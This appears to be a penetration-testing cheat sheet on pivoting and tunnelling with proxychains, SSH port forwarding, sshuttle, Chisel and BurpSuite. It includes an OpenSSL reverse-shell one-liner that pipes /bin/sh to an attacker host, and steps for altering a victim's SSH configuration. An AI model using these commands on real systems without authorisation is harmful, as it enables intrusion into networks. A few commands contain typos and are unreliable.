## Important Notes

### Avoid Using ICMP for SOCKS Proxies
- **Do not use ICMP echo requests (ping) to test SOCKS proxies.**
  
  SOCKS is a protocol that forwards network packets between a client and server through a proxy. It primarily handles TCP connections to any IP and forwards UDP packets as well.
  
  To test a SOCKS proxy, use a **TCP-based protocol**, such as:
  - **SSH** (Secure Shell)
  - **HTTP GET requests** through a tunnel
  
  **Reminder**: ICMP (ping) is not suitable for testing SOCKS proxies.

---

### NMAP Usage with SOCKS Proxy
- **Use NMAP with TCP connect scan (`-sT`) and disable ping (`-Pn`)**.

  This configuration also applies to:
  - **Version scanning** (`-sV`)
  - **Script scanning** (`-sC`)
  
  Ensure all these scans are used alongside `-sT` and `-Pn`.

  **Examples:**
  ```bash
  proxychains nmap -sT -Pn -p- x.x.x.x
  proxychains nmap -sT -Pn -sV -sC -p 21,80,443,445 x.x.x.x
  ```

### Running Scripts & Binaries with Proxychains
When using proxychains with interpreted programs (e.g., Python scripts), it's best to explicitly reference the interpreter.

Example:
```bash
proxychains4 [-q -f proxychains.conf] python python_script.py
```

Even if the script includes a hashbang (#!), specifying the interpreter can prevent network connection failures that occur when the script's traffic isn't routed through the proxy properly. Source

### Quiet Mode in Proxychains
Uncomment the "quiet mode" line in `/etc/proxychains.conf` to suppress stdout messages that may clutter your terminal.

This is optional, but it can make the output cleaner and easier to manage.


## SSH Dynamic Port Forwarding
Allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine.

**How to set it up**:  
1. Edit /etc/proxychains.conf and implement the following:
   - Remove **Dynamic chain** from comment.
   - Comment **Strict chain** and **Random chain**.
   - Append line **socks4 127.0.0.1 9050** at the end of the document (proxy list), save and close file. *You can, of course, use a different port.

2. Setup the SSH Dynamic Port Forwarding:  
  ```
  ssh -D 127.0.0.1:9050 user@victim-IP
  ```

**Usage examples**:  
With x.x.x.x being the ip address of a host that belongs to the tunneled network:  
  ```
  proxychains nmap -sT -Pn -p- x.x.x.x
  proxychains smbmap -H x.x.x.x
  proxychains ssh user@x.x.x.x
  ```
In order to use a browser through the tunnel:  

  ```
  proxychains chrome
  proxychains firefox
  ```  

## SSH Remote Port Forwarding

If you're looking for a way to establish a **reverse shell through a pivot tunnel**, SSH remote port forwarding is what you need. This method allows you to forward a port on the remote (victim) machine to a port on the local (attacker) machine.

### Steps to Set Up SSH Remote Port Forwarding

1. **SSH into the Victim Machine**
   - Access the victim machine via SSH.

2. **Modify SSH Configuration**
   - Open the `/etc/ssh/sshd_config` file and make the following changes:
     - Uncomment and change `GatewayPorts no` to `GatewayPorts yes`.
     - This step is crucial. If not done, the tunnel will only bind to `127.0.0.1` (localhost) instead of `0.0.0.0`, preventing traffic forwarding from external hosts.

3. **Restart SSH Service**
   - Apply the changes by restarting the SSH service:
     ```bash
     sudo service ssh restart
     ```
   - Exit the session and return to your local machine.

4. **Set Up Remote Port Forwarding**
   - After setting up, run the following command to forward a remote port:
     ```bash
     ssh -R 2222:*:2222 user@victim-IP
     ```

5. **Test the Setup**
   - Set a listener on your attacker machine (e.g., using `netcat`):
     ```bash
     nc -lvp 2222
     ```
   - On the victim machine, connect to the forwarded port:
     ```bash
     nc 127.0.0.1 2222
     ```
   - If your attacker machine receives the connection, the forwarding works, and all traffic to `victim-IP:2222` will be forwarded to your attacker machine.

6. **Forward Multiple Ports**
   - You can forward multiple ports by adding additional `-R` options:
     ```bash
     ssh -R 2222:*:2222 -R 3333:*:3333 user@victim-IP
     ```

**Note**: Traffic from external hosts (pivoting network) must target the victim IP to be forwarded back to the attacker machine.

**Alternative Method**: You can also implement remote port forwarding by SSH'ing from the victim to the attacker machine.


## SSH Local Port Forwarding

Local port forwarding allows you to forward a port on the local (attacker) machine to a port on the remote (victim) machine. This is particularly useful for scanning local ports on the victim.

### Usage
```bash
ssh user@victim-IP -L 8888:127.0.0.1:8086
```

This forwards local port 8888 to port 8086 on the victim machine. Now, you can scan the forwarded port on the victim machine using a tool like nmap:

```bash
nmap -Pn -n -p8888 -sV 127.0.0.1
```

## Double Pivoting
A great resource related to Double Pivoting can be found [here](https://pentest.blog/explore-hidden-networks-with-double-pivoting/). Double pivoting involves using SSH Dynamic Port Forwarding and Proxychains to reach multiple intermediate hosts.

### Concept
Assume we have the following machines:

| IP        |	Role     |
| --------- | -------- |
|10.10.10.10|	Attacker |
|10.10.10.11|	Jumphost1|
|172.16.1.12|	Jumphost2|
|172.16.2.13|	Jumphost3|


* The Attacker can reach Jumphost1.
* Jumphost1 can reach Jumphost2.
* Jumphost2 can reach Jumphost3.

### Steps for Double Pivoting
1. Implement Dynamic Port Forwarding for Jumphost1
   * Set up SSH Dynamic Port Forwarding to reach Jumphost2 from Jumphost1.
2. Edit Proxychains Configuration
   * Open the /etc/proxychains.conf file and add another SOCKS proxy entry at the end of the file:
    ```bash
    ...
    socks4 127.0.0.1 9050
    socks4 127.0.0.1 9999
    ```
3. Dynamic Port Forwarding for Jumphost2
   * SSH into Jumphost1 and set up another Dynamic Port Forwarding for Jumphost2:
    ```bash
    ssh -D 127.0.0.1:9999 user@Jumphost2
    ```
    At this point, you should be able to reach Jumphost3 using proxychains, leveraging the double pivoting technique.

## SSHuttle

**SSHuttle** allows you to create a VPN-like connection from your machine to any remote server via SSH. It works as long as the remote server has Python 2.3 or higher. This tool enables you to forward all network traffic from your local machine through the remote server, effectively creating a VPN over SSH.

### Key Features:
- **Root access** is required on the local (client) machine.
- On the remote (server) machine, only a **regular user account** is required (root is not necessary).
- You can run **multiple instances of SSHuttle** simultaneously on a single client machine, connecting to different servers, allowing you to be on multiple VPNs at once.
- For more information, check the [SSHuttle GitHub repository](https://github.com/sshuttle/sshuttle).

### Usage Example
Assuming you want to pivot into the network `172.16.2.0/16`:

```bash
# Connect to remote host
sshuttle -vvr root@victim 172.16.2.0/16
```

### Using SSH Key for Authentication
If you'd like to use an SSH key for authentication instead of a password:

```bash
sshuttle -vvr root@victim --ssh-cmd 'ssh -i ~/.ssh/id_rsa' 172.16.2.0/16
```

This command specifies the SSH key to use (~/.ssh/id_rsa) when connecting to the remote server.

### Route dns queries through proxy

```bash 
sshoutle -dns -vv -r root@victim 0/0
```

## OpenSSL
Very wide spread and great for Living of The Land. This command-line application usually is used to perform cryptographic tasks, such as creating and handling certificates and related files. With some creativity OpenSSL can also used in a different way

### Generate a new RSA key & create certificates
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

### Start a listener on local host
```bash
openssl s_server -quiet -key.pem -cert cert.pem -port [LPORT]
```

### Connect from target to listening port
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [LHOST]:[LPORT] > /tmp/s; rm /tmp/s
```

## Chisel

**Chisel** is a fast TCP/UDP tunneling tool that operates over HTTP, secured via SSH. It includes both client and server functionalities in a single executable, making it a powerful and versatile tool for port forwarding. Written in Go (Golang), Chisel is known for its speed and simplicity, and it's especially useful in penetration testing scenarios.

### Installation

You can easily install Chisel on Kali Linux using the following command:

```bash
apt install chisel
```

To use Chisel on a victim machine, you will need to upload the Chisel binary. Precompiled versions are available for download [here](https://github.com/jpillora/chisel/releases).

### Local Port Forwarding Example

1. **On the Attacker Machine:**
   - Start the Chisel server with reverse port forwarding:
   
   """
   chisel server -p 8000 --reverse
   """

2. **On the Victim Machine:**
   - Run the Chisel client to connect to the attacker and forward a local port to the remote attacker machine:

   ```bash
   ./chisel_1.7.7_linux_amd64 client attacker-ip:8000 R:1234:127.0.0.1:8443
   ```

In this example, traffic from the **attacker machine's port 1234** is forwarded to the **victim machine's port 8443**.

Chisel can be used for a wide range of port forwarding and tunneling scenarios, making it a must-have tool for network penetration testers.

## Using BurpSuite as a Proxy

**BurpSuite** supports proxy configurations, a powerful feature that allows you to intercept and manipulate traffic. This can be especially useful in penetration testing when combined with techniques like SSH Dynamic Port Forwarding or SSHuttle.

### How to Set It Up

1. **Start BurpSuite** and configure the proxy settings:
   - Go to the **Proxy** tab, then select **Options**.
   - Under the **Proxy Listeners** section, click **Add**.
   - Set the desired **binding port** and **interface**.
   - In the second tab, configure the **host** and **port** where you want to redirect the traffic.

2. **Use BurpSuite with SSH Tunneling**:
   - After setting up an **SSH Dynamic Port Forwarding** or **SSHuttle** tunnel, you can use BurpSuite to redirect traffic through the tunnel by sending it to your localhost binding port.

### Example with Gobuster

Assuming you've set port **2222** as the redirect port, you can perform a directory brute force through the tunnel using **Gobuster**:

```bash
gobuster dir -u http://127.0.0.1:2222 -t 40 -w /some/dirlist.txt
```

This command will brute force directories on the target host by sending traffic through the configured BurpSuite proxy.
